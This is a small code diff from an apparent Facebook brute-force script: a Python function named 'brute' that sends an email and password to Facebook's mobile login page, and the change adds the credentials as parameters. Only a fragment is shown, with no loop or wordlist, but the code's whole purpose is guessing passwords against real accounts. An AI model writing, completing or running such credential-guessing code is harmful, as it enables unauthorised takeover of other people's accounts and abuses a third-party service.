@@ -1,6 +1,6 @@
 import requests, sys
 
-def brute():
+def brute(id,pw):
 		link = ("https://m.facebook.com/login.php")
 		data = {"email":id, "pass":pw}
 		r = requests.post(link, data=data)
